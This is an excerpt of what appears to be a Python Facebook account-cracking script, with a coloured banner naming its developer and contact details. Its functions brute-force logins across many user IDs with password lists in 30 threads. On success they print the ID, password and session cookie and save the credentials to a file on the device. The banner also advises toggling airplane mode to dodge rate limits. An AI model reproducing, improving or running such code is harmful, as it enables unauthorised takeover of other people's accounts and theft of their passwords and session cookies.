...
\x1b[38;5;77m──────────────────────────────────────────────                 
\x1b[38;5;78m〘✧〙DEVLOPER  \x1b[38;5;222m➤  \x1b[38;5;78m RAFI XHOWDHURY
\x1b[38;5;79m〘✧〙FACEBOOK  \x1b[38;5;222m➤  \x1b[38;5;79m ARIYAN XHOWDHURY
\x1b[38;5;115m〘✧〙WHATSAPP  \x1b[38;5;222m➤   \x1b[38;5;115m+8801301668047
...
def bhoot():
    ...
    with ThreadPool(max_workers=30) as TANIM:
        tl = str(len(user))
        print('\x1b[38;5;155m[➤] \x1b[38;5;222mUSE FLIGHT MOD AFTER 2 MINUTES GET MORE OK IDZ <>~~~');linex()
        for love in user:
...
def api(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\x1b[38;5;155m[➤] RAFI~FINDING  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
    try:
        for pas in pwv:
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\x1b[38;5;84m[RAFI-LIVE] '+ids+' ~~ '+pas+'\x1b[38;5;155m')
                print('\033[1;92m[COOKIE] : ➤ : '+kuki+'\x1b[38;5;223m');linex()
                oks.append(ids)
                open('/sdcard/RAFI-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
